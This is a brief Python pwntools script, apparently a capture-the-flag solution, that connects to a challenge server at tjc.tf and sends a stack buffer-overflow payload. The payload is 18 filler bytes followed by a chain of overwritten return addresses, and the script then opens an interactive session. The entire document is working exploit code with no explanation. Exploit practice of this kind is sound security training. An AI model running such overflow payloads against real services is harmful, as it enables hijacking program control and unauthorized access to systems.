#!/usr/bin/env python3
from pwn import *

#target = process("./out")
#gdb.attach(target, gdbscript="b read")
target = remote("tjc.tf", 31080)

target.recvuntil(" > ")

payload = b"1" * 18 + p64(0x401284) + p64(0x2) + p64(0x40101a) + p64(0x4011b3)
target.sendline(payload)

target.interactive()